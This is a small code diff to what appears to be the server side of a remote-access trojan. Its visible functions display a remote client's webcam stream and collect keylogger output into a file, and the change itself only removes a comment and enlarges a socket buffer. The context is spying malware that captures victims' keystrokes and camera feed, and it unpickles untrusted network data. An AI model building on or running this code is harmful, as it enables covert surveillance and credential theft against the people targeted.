@@ -34,7 +34,6 @@ def webCam(conn, command, addr):
         
         frame_data = data[:msg_size]
         data = data[msg_size:]
-        ###
 
         frame=pickle.loads(frame_data)
         cv2.imshow(f'Client\'s webcam {addr[0]}:{addr[1]}',frame)
@@ -51,7 +50,7 @@ def transfer(conn,command):
     conn.send(command)
     f = open('key_logs.txt','wb')
     while True:  
-        bits = conn.recv(1024)
+        bits = conn.recv(1024*1024)
         if b'DONE' in bits:
             time.sleep(2)
             print('[-] Keylogger terminated completed')
